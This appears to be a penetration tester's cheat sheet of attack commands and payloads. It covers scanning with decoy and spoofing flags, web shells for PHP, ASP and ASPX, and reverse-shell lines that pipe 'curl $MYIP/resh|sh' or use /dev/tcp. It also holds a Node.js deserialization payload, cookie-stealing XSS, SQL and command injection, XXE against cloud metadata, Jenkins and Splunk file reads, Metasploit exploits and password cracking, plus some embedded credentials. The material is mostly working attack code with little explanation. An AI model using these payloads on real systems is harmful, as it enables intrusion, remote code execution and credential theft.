# Setup
## New Project
PROJECT="$HOME/Projects/$TARGET"; sudo -v; [ "$(tmux display-message -p '#W')" != "Shells" ] && mkdir -p "$PROJECT" && cd "$PROJECT" && echo "PROJECT=$PROJECT" >> ~/.zshrc && echo "cd $PROJECT" >> ~/.zshrc && touch usernames passwords && echo "\nanonymous\nadministrator\nguest\nkrbtgt\nroot\nbin\nnone" > usernames && echo "\nanonymous" > passwords && tmux list-windows -F '#{window_id}:#{window_name}' | awk -F: '$2!="Shells"{print $1}' | xargs -I {} tmux list-panes -t {} -F '#{pane_id}' | while read pane_id; do tmux send-keys -t $pane_id 'source ~/.zshrc' C-m; tmux send-keys -t $pane_id C-l; done

## Configurations
[*] Bitlocker
Run PowerShell as Administrator
(Get-BitLockerVolume -MountPoint C:).KeyProtector
Unlock-BitLocker -MountPoint C: -RecoveryPassword "123456-789012-345678-901234-567890-123456-789012-345678"
Disable-BitLocker -MountPoint C:
Clone Drive

[*] VMWare
vmware
Edit ➜ Virtual Network Adapter ➜ Change Settings ➜ Add Network ➜ VMnet10
Bridged ➜ Bridged to: Realtek USB GbE Family Controller #2 ➜ Rename Network ➜ Hard Bridged ➜ OK
VM ➜ Settings ➜ Network Adapter ➜ Custom: Hard Bridge

[*] WSL2
%USERPROFILE%\.wslconfig

[wsl2]
networkingMode=bridged
vmSwitch="BridgeEth2"
dnsTunneling=true
dhcp=true
ipv6=false

sudo nano /etc/wsl.conf
[network]
generateResolvConf = false
generateHosts = false

[time]
useWindowsTimezone = false

[boot]
systemd = true
command = sudo chattr -i /etc/resolv.conf; cat /nameservers > /etc/resolv.conf

[*] DNS
sudo nano /etc/resolv.conf
nameserver 1.1.1.1
nameserver 192.168.1.254

[*] Subnets
ipcalc 10.0.2.4 255.255.255.0

[*] Network Adapters
sudo nmcli con show
sudo nmcli con del $uuid
sudo nmcli con add type ethernet ifname eth0 con-name eth0 autoconnect yes
uuid=e06de7a8-e79d-3cce-8063-fcaba7c7d6d0
sudo nmcli con mod $uuid ipv4.addresses 172.16.1.201/24
sudo nmcli con mod $uuid ipv4.gateway 172.16.1.1
sudo nmcli con mod $uuid +ipv4.dns 1.1.1.1
sudo nmcli con mod $uuid +ipv4.dns 8.8.8.8
sudo nmcli con mod $uuid +ipv4.dns 10.129.123.1
sudo nmcli con mod $uuid +ipv4.dns 10.130.108.1
sudo nmcli con mod $uuid -ipv4.dns 1.2.3.4
sudo nmcli con mod $uuid ipv4.method manual
sudo nmcli con mod $uuid ipv6.method ignore
sudo nmcli con mod $uuid ipv4.route-metric 100
sudo nmcli con mod $uuid ipv4.routes "0.0.0.0/0 10.129.123.1"
sudo nmcli con mod $uuid ipv4.routes "0.0.0.0/0 10.130.108.1"
sudo nmcli con mod $uuid ipv4.routes "0.0.0.0/0 172.28.240.1"
sudo nmcli con up $uuid
sudo nmcli con show $uuid | grep 'ipv4'
sudo systemctl restart NetworkManager.service
sudo systemctl restart networking.service

# Discovery
## Nesus
systemctl status nessusd; systemctl start nessusd; chromium "https://localhost:8834"

## External scans
(sudo nmap -n -Pn -sS "$TARGET" -oA 'TCP_1000_$TARGET' --open --min-rate 250 --max-rate 500 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --mtu 32 --data-length 0 &)
(sudo nmap -n -Pn -sU "$TARGET" -oA 'UDP_1000_$TARGET' --open --min-rate 250 --max-rate 500 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --data-length 0 &)
(sudo nmap -n -Pn -sS "$TARGET" -oA 'TCP_ALL_$TARGET' --open --min-rate 250 --max-rate 500 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --mtu 32 --data-length 0 -p- &)
(sudo nmap -n -Pn -sU "$TARGET" -oA 'UDP_ALL_$TARGET' --open --min-rate 250 --max-rate 500 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --data-length 0 -p- &)
(udpy_proto_scanner.py $TARGET | tee udpy_proto_scanner_$TARGET &)
(enum4linux-ng -A $TARGET | tee enum4linux_$TARGET &)

## Internal scans
netdiscover
nbtscan-unixwiz $TARGET/24 -m -n -w 0 | sort -k2
fping -ag $TARGET/24
sudo nmap -n -Pn -sS '$TARGET/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --min-rate 250 --max-rate 500 -vvvv 2>&1 | stdbuf -oL grep --color=never -oP '(?<=on )\d{1,3}(?:\.\d{1,3}){3}' | tee tmp.hosts
sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_
sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_$TARGET__24'
sudo nmap -n -Pn -sS '$TARGET/24' --excludefile hosts_ -F --open --max-rate 50 -oA 'TCP_ALL_$TARGET__24'

# Tech and Protocols
## Web
[*] Web Shell
+---------- Create ----------+
-->> PHP
echo -n '<?=`$_GET[cmd]`?>' | tee x.php

-->> ASP
echo -n '<% Response.ContentType = "text/plain"\nSet s = CreateObject("WScript.Shell")\nSet c = s.Exec("cmd /c " & Request("cmd"))\nResponse.Write c.StdOut.ReadAll() %>' | tee x.asp

-->> ASPX
echo '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){if(Request.QueryString["cmd"]!=null){Response.ContentType="text/plain";Response.Write(Server.HtmlEncode(ExcuteCmd(Request.QueryString["cmd"])));Response.End();}}string ExcuteCmd(string arg){ProcessStartInfo ps=new ProcessStartInfo();ps.FileName="cmd.exe";ps.Arguments="/c "+arg;ps.RedirectStandardOutput=true;ps.UseShellExecute=false;Process p=Process.Start(ps);StreamReader stmrdr=p.StandardOutput;string s=stmrdr.ReadToEnd();stmrdr.Close();return s;}</script><HTML><body><form id="cmd" runat="server" onsubmit="return false;"><asp:TextBox id="i" runat="server"></asp:TextBox></form><pre id="r"></pre><script>document.getElementById("i").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();var v=this.value;fetch("?cmd="+encodeURIComponent(v)).then(r=>r.text()).then(t=>{document.getElementById("r").innerText=t;});}});</script></body></HTML>' | tee x.aspx

-->> XML / ASP (web.config)
echo -e '<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n<system.webServer>\n<handlers accessPolicy="Read, Script, Write">\n<add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />\n</handlers>\n<security>\n<requestFiltering>\n<fileExtensions>\n<remove fileExtension=".config" />\n</fileExtensions>\n<hiddenSegments>\n<remove segment="web.config" />\n</hiddenSegments>\n</requestFiltering>\n</security>\n</system.webServer>\n</configuration>\n<% Response.ContentType = "text/plain"\nSet s = CreateObject("WScript.Shell")\nSet c = s.Exec("cmd /c " & Request("cmd"))\nResponse.Write c.StdOut.ReadAll() %>' | tee web.config

+---------- Execute ----------+
-->> PHP and ASP
curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=whoami /priv'
curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'

-->> ASPX
curl -X PUT -d @x.aspx http://$TARGET/x.txt
curl -X MOVE http://$TARGET/x.txt -H 'Destination:http://$TARGET/x.aspx'
curl -G --path-as-is 'http://$TARGET/x.aspx' --data-urlencode 'cmd=whoami /priv'

+---------- Variations ----------+
-->> PHP
<?=`$_GET[cmd]`?>
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php echo system($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>

-->> PHP Interactive
<html>
<body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input id="cmd" type="TEXT" name="cmd" autofocus size="80" value="<?php echo isset($_GET['cmd']) ? htmlentities($_GET['cmd']) : ''; ?>" style="outline: none; background: inherit;border: none;font-size: 16px;color: inherit;font-family: inherit;font-weight: 800;">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {system($_GET['cmd'] . ' 2>&1');}
?>
</pre>
<script>
    var cmdElement = document.getElementById('cmd');
    cmdElement.focus();
    cmdElement.setSelectionRange(cmdElement.value.length, cmdElement.value.length);
</script>
</body>
</html>

[*] PHP
https://www.php.net/manual/en/wrappers.php

index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file://../../../../../../../etc/passwd
index.php?page=ssh2.exec://UERNAME:PASSWORD@127.0.0.1/curl+$MYIP:53/resh|sh;

[*] WordPress
wpscan --update > /dev/null; wpscan -e ap,t,tt,u --api-token $WPSCAN_API --url ://$DOM
Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/

[*] Joomla
curl http://$TARGET/administrator/manifests/files/joomla.xml
curl -s "http://$TARGET/api/index.php/v1/config/application?public=True" | jq

[*] Git / Gitlab / Gitea
+---------- Git ----------+
git-dumper http://$TARGET source; cd source; git status
git diff --cached /file/name/here
export GIT_SSL_NO_VERIFY=true; git clone https://$USERNAME:$PASSWORD@$DOM/USER/REPO.git ./git
git branch -a
git checkout branch_name
git log --oneline
git diff a76f8f7
tree ./git -a -f
git rev-list --all
git cat-file -p acb753dd975a639f2dbc28ee8fd4d67adc50e609
git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git

+---------- Gitlab ----------+
-->> CVE-2020-10977 (GitLab CE/EE 8.5 to 12.9)
http://$TARGET/help
msfconsole -q -x 'use exploit/multi/http/gitlab_file_read_rce; set VHOST git.$DOM; set SSL true; set RHOSTS $TARGET; set RPORT 443; set USERNAME test; set PASSWORD testtest; set LHOST tun0; set LPORT 8787; set ForceExploit true; run'

-->> Running Ports
curl -s http://$MYIP:53/linux/netstat.rb | ruby

-->> Change Password of User
gitlab-rails console -e production
user = User.where(username: '$USERNAME').first
user.password = '123qweasdF!'
user.password_confirmation = '123qweasdF!'
user.save!
Login: https://git.$DOM/$USERNAME

+---------- Gitea ----------+
docker-compose.yml
 volumes:
      - /home/developer/gitea/data:/data
        /data/gitea/gitea.db

[*] Outlook (OWA)
./owabrute.sh -d $DOM -u usernames -p passwords_custom_seasons_5_years

[*] Flask
-->> File Upload Traversal
filename="..//app/app/views.py"

-->> Malicious Route
@app.route('/x')
def rev():
    import subprocess
    subprocess.Popen("wget -qO- $MYIP/resh|sh", shell=True)
    subprocess.Popen("curl $MYIP/resh|sh", shell=True)
    return ""

[*] Node.js
echo 'bash -i >& /dev/tcp/$MYIP/5555 0>&1' | base64
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSAJiAvZGV2L3RjcC8xMC4xMC4xNi4yLzU1NTUgMD4mMQo=|base64 -d|bash', function(error, stdout, stderr){console.log(stdout)});}()"}
Cookie: auth=%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%65%63%68%6f%20%59%33%56%79%62%43%41%78%4d%43%34%78%4d%43%34%78%4e%69%34%79%4f%6a%67%34%4f%44%67%76%63%6d%56%7a%61%41%6f%3d%20%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d

[*] Jenkins
-->> Download CLI
wget $TARGET:8080/jnlpJars/jenkins-cli.jar

-->> Read File System
java -jar jenkins-cli.jar -s http://$TARGET:8080/ -auth @password.txt reload-job @/etc/passwd 2>&1 | awk 'NF' | grep -vE '\-jar|Reload|VAL' | awk -F' No such item ' 'NF>1{print $1}' | sed 's/:$//'
java -jar jenkins-cli.jar -s http://$TARGET:8080/ -auth @password.txt reload-job @/var/jenkins_home/secrets/initialAdminPassword 2>&1 | awk 'NF' | grep -vE '\-jar|Reload|VAL'
java -jar jenkins-cli.jar -s http://$TARGET:8080/ -auth @password.txt reload-job @/var/jenkins_home/users/users.xml 2>&1 | awk 'NF' | grep -vE '\-jar|Reload|VAL' | awk -F' No such item ' 'NF>1{print $1}' | sed 's/:$//'
java -jar jenkins-cli.jar -s http://$TARGET:8080/ -auth @password.txt reload-job @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml 2>&1 | awk 'NF' | grep -vE '\-jar|Reload|VAL' | awk -F' No such item ' 'NF>1{print $1}' | sed 's/:$//'

-->> Malicious Pipeline
node {
  sshagent (credentials: ['1']) {
    sh 'ssh -o StrictHostKeyChecking=no -l root $TARGET la -la /root/.ssh'
  }
}
node {
  sshagent (credentials: ['1']) {
    sh 'ssh -o StrictHostKeyChecking=no -l root $TARGET cat /root/.ssh/id_rsa'
  }
}


[*] Pluck
+---------- Set Password ----------+
XPASSWORD=lexypoo97

+---------- Get Session ID ----------+
PHPSESSID=$(curl -s -i -L -X POST -d "cont1=$XPASSWORD&bogus=&submit=Log+in" 'http://$TARGET/login.php' -H 'Content-Type: application/x-www-form-urlencoded' | grep -oP 'PHPSESSID=\K[^;]+');echo $PHPSESSID

+---------- Create Webshell  ----------+
echo -n '<?=`$_GET[cmd]`?>' | tee x.php

+---------- Upload Webshell  ----------+
zip x.zip x.php
curl -s -i -X POST -F "sendfile=@x.zip;type=application/zip" -F "submit=Upload" "http://$TARGET/admin.php?action=installmodule" -H "Cookie: PHPSESSID=$PHPSESSID" | grep -oP 'The module has been installed successfully.'

+---------- Execute Command ----------+
wsh http://$TARGET/x.php
curl $MYIP:53/resh|sh
curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=whoami /priv'

[*] Splunk
curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd'
curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf'
curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/server.conf'
curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret' -s | tee splunk.secret
cat $SPLUNK_HOME/etc/system/local/*
cat $SPLUNK_HOME/etc/auth/splunk.secret
echo 'Cly/0Yk0HfY8jnpi24PrCTPInIi4m9j1xMH...<SNIP>splunk.secret...' > splunk.secret
splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$1$NkgCo9/pK0KB'
splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='

[*] Zabbix
+---------- Login Get Auth Key ----------+
curl \
--request POST "http://$TARGET/zabbix/api_jsonrpc.php" \
--header 'Content-Type: application/json-rpc' \
--data '{"jsonrpc":"2.0","method":"user.login","params":{"username":"matthew","password":"96qzn0h2e1k3"},"id":1}'

+---------- Set Auth Key ----------+
AUTH_KEY=23b5c3d2e3c6a3ac6ec692ece555aad1

+---------- Add Account to All Groups ----------+
for i in {0..50}; do response=$(curl \
--request POST -s "http://$TARGET/zabbix/api_jsonrpc.php" \
--header 'Content-Type: application/json-rpc' \
--data "$(printf '{"jsonrpc":"2.0","method":"user.update","params":{"usrgrps":[{"usrgrpid":"%s"}],"userid":"3"},"auth":"%s","id":3}' "$i" "$AUTH_KEY")");[[ $response != *"error"* ]] && echo "[+] Added to group ID $i"; done

+---------- Get Users, Password Hash and RoleID ----------+
curl \
--request POST -s "http://$TARGET/zabbix/api_jsonrpc.php" \
--header 'Content-Type: application/json-rpc' \
--data "$(printf '{"jsonrpc": "2.0", "method":"user.get", "params": {"selectRole":["roleid, u.passwd"]}, "auth":"%s", "id": 1}' "$AUTH_KEY")" | jq -r '.result[] | [.username, .role.passwd, .role.roleid] | @csv'

+---------- Dump Active Sessions ----------+
sqlmap \
--method POST -u "http://$TARGET/zabbix/api_jsonrpc.php" \
--headers="Content-Type: application/json-rpc" \
--data="$(printf '{"jsonrpc":"2.0","method":"user.get","params":{"selectRole":["roleid, *"]},"auth":"%s","id":1}' "$AUTH_KEY")" \
--random-agent -D zabbix -T sessions --columns --dump

+---------- Verify Session ID ----------+
curl -X POST http://$TARGET/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc": "2.0","method": "user.checkAuthentication","params": {"sessionid": "fdcfbcb99704cba0bf030d626d671510"},"id": 1}'

[*] LaTeX
http://$TARGET/equation.php?eqn=\newwrite\outfile\openout\outfile=x.php\^^77rite\outfile{<?=`$_GET[cmd]`?>}\closeout\outfile

[*] XDEBUG_SESSION
+---------- Start Listener ----------+
python3 XDEBUG_SESSION.py

+---------- Attack XDEBUG_SESSION ----------+
curl http://$TARGET -H "Cookie: XDEBUG_SESSION="

+---------- Execute Commands ----------+
python_cmd >> system("curl $MYIP:53/resh|sh")

[*] Curl
curl -X GET --path-as-is 'http://$TARGET/../../../../../../../../../../../../windows/system32/drivers/etc/hosts'
cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerUrl, .url] | @csv'
cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H "Api-Version: 3.0" -s | jq -r "[.id, .clientName, .clientKey] | @csv"'

[*] File Upload
-->> Bad PDF
msfconsole -q -x 'use auxiliary/fileformat/badpdf; set LHOST $MYIP; set FILENAME x.pdf; run; exit'; cp $HOME/.msf4/local/x.pdf /Upload/x.pdf
impacket-smbserver -smb2support $ /Upload/windows

-->> Zip Slip
evilarc.py x.php --path 'var/www/html' --depth 6 --os unix --output-file x.zip
wsh ://$TARGET/x.php

-->> Bypasses
shell.PhP
shell.phar
shell.P.phpHP
shell%2EPHP
shell%2Ephar%00%2Epng
shell%2Ephar%00.png

-->> Checking Directory Listings for PUT method
cat dirsearch.txt | jq -r '.results[] | select(.status==200 and (.url | endswith("/"))) | .url' | httpx -method -x all -sc -mc 200 > httpx_method_all_200

-->> Via Curl
curl --upload-file shell.php http://$TARGET:80/upload/

[*] Path Traversal
ffuf -u 'http://$TARGET/nav.php?page=../../../../../../../../../../../..FUZZ' -w /usr/share/wordlists/common_lists/lfi_linux.txt -t 30 -rate 300 -v -mc 200 -fw 3
| strings | grep -oP 'http.*' | cat
curl -X GET --path-as-is 'http://$TARGET/../../../../../../../../../../../../windows/system32/drivers/etc/hosts'

[*] LFI
/windows/system32/drivers/etc/hosts
/proc/self/environ
/etc/passwd
//$MYIP//responder
index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
GET /image?filename=/var/www/images/../../../etc/passwd
GET /image?filename=../../../etc/passwd%00.png

[*] XSS
<img src=x onerror=fetch('http://$MYIP/'+document.cookie);>
<img src=x>'"${{7*7}}
<svgonload=alert(document.cookie)>
<svg/onload=alert(document.cookie)>
"onmouseover="alert(document.cookie)
javascript:alert(document.cookie)
?returnPath=javascript:alert(document.cookie)
<iframe src="https://vulnerable.site/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
{{$on.constructor('alert(document.cookie)')()}}
\"-alert(document.cookie)}//
<<<>>><img src="x"/onerror=alert(document.cookie)>
</><TAG/EVENT="">
<iframe src="https://$TARGET/?search=%22%3E%3Cbody%20onresize%3Dalert%28document%2Ecookie%29%3E" onload=this.style.width='0px'>

[*] SQLi
-->> Read Files
sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 --privileges
sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 --file-read=/etc/passwd
/etc/nginx/sites-enabled/default.conf
/etc/nginx/sites-enabled/default
/etc/apache2/sites-enabled/000-default.conf
/var/www/$DOM/index.php
/var/www/$DOM/app.py
/var/www/$DOM/__init__.py
/var/www/$DOM/main.py

-->> Enumerate Database
sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 --dbs
sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 -D dbname --tables
sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 -D dbname -T users --columns --dump

-->> Manual Injections
'
' OR 1=1 -- #
OR 1=1 -- #
AND 1=1 -- #
' AND 1=1 -- #
admin' and 1=1 -- -#
administrator'-- #
' ORDER BY 1 -- #
' UNION SELECT table_name,NULL FROM information_schema.tables -- #
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_efwvmk' -- #
' UNION SELECT username_aakuyh,password_wrukls FROM users_efwvmk -- #
' AND 1=(SELECT 1 FROM users LIMIT 1) -- #
' AND 1=(SELECT 1 FROM users WHERE username='administrator') -- #
' AND 1=(SELECT 1 FROM users WHERE username='administrator' AND LENGTH(password)=20) -- #
' AND '$x$'=(SELECT SUBSTR(password,$1$,1) FROM users WHERE username='administrator') -- #
"AND"1"="1
year=2005 ORDER BY 4
username=admin', 'password', true, '2025-02-03 15:14:29.253', 2133415744)-- #&password1=admin&password2=admin	# INSERT INTO sqlinjection004_users (username, password, isAdmin, lastLogin, lastIP)
username=target';-- # &password1=test&password2=test 

[*] Command Injection
;id #
;sleep+10;
;sleep+10;cat+/etc/passwd+>+/var/www/images/test.txt;
;cat /etc/passwd
;echo 'L2V0Yy9wYXNzd2Q=' | base64 -d | xargs cat
;cat "$(echo 'L2V0Yy9wYXNzd2Q=' | base64 -d)"
;ls -la "$(echo 'Li4vLi4vLi4vCg==' | base64 -d)"
;ls -laR "$(echo 'Li4vLi4vLi4vLi4vLi4vCg==' | base64 -d)"
logname=;cat /etc/passwd > log.txt
&amp;id

[*] Content Types
application/x-httpd-php
application/json
application/javascript
application/xml
application/x-www-form-urlencoded
application/pdf
application/zip
application/x-tar
application/x-gzip
multipart/form-data
image/jpeg
image/png
image/gif
text/html
text/plain
text/css

[*] HTTP Methods
GET
HEAD
POST
PUT
DELETE
CONNECT
OPTIONS
TRACE
PATCH

[*] Headers
X-Forwarded-For: 1

[*] XXE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>

productId=<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text" />

Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?><x>x</x>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

[*] JWT
git clone https://github.com/wallarm/jwt-secrets.git ~/.git/jwt_secrets

hashcat -a 0 -m 16500 <JWT> ~/.git/jwt_secrets/jwt.secrets.list

[*] GraphQL
curl -s $TARGET/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { types {name} } }" }' | jq | grep 'name' | strings
curl -s $TARGET/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: \"User\") { name fields { name } } }" }' | jq | grep 'name' | strings
curl -s $TARGET/graphql -H "Content-Type: application/json" -d '{ "query": "{ User { username password } }" }' | jq | grep -E 'username|password' | strings

-H "Content-Type: application/json"
-d '{"query":"{\n\n__schema\n\n{queryType{name}}"}'

{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

{"query":"{\u000A\n\r\t__schema\u000A\n\r\t{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

/api?query=query+IntrospectionQuery+%7B%0A++%0A%0A%0A%0A%5f%5fschema%0A%0A%0A%0A+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A

nano gql; gqlspection -f gql

https://datafetcher.com/graphql-json-body-converter

{  "query": "query { getUser(id: 3) { id username }}"  }

{  "query": "mutation { deleteOrganizationUser(input: {id:3}) { user { id username } }}"  }

## Infrastructure
[*] Cracking
+---------- Identify ----------+
haiti cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc

+---------- PFX ----------+
pfx2john auth.pfx
openssl pkcs12 -in auth.pfx -nocerts -out auth.key-enc
openssl rsa -in auth.key-enc -out auth.key
openssl pkcs12 -in auth.pfx -clcerts -nokeys -out auth.crt
evil-winrm -i $TARGET -S -k auth.key -c auth.crt

+---------- HEX ----------+
echo -n '6b,cf,2a,4b,6e,5a,ca,0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
echo -n '6bcf2a4b6e5aca0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d

+---------- John ----------+
john hashes -w=$rockyou
john hashes --show

+---------- *2john ----------+
/usr/bin/1password2john
/usr/bin/7z2john
/usr/sbin/bitlocker2john
/usr/bin/ccache2john
/usr/bin/cisco2john
/usr/bin/dashlane2john
/usr/bin/diskcryptor2john
/usr/bin/DPAPImk2john
/usr/bin/ecryptfs2john
/usr/bin/enpass2john
/usr/bin/filezilla2john
/usr/sbin/gpg2john
/usr/sbin/hccap2john
/usr/bin/htdigest2john
/usr/bin/kdcdump2john
/usr/sbin/keepass2john
/usr/bin/keychain2john
/usr/bin/keyring2john
/usr/bin/keystore2john
/usr/bin/kirbi2john
/usr/bin/krb2john
/usr/bin/lastpass2john
/usr/bin/libreoffice2john
/usr/bin/luks2john
/usr/bin/mozilla2john
/usr/bin/office2john
/usr/bin/openssl2john
/usr/bin/padlock2john
/usr/bin/pcap2john
/usr/bin/pdf2john
/usr/bin/pem2john
/usr/bin/pfx2john
/usr/sbin/putty2john
/usr/bin/pwsafe2john
/usr/bin/radius2john
/usr/sbin/rar2john
/usr/bin/sap2john
/usr/bin/ssh2john
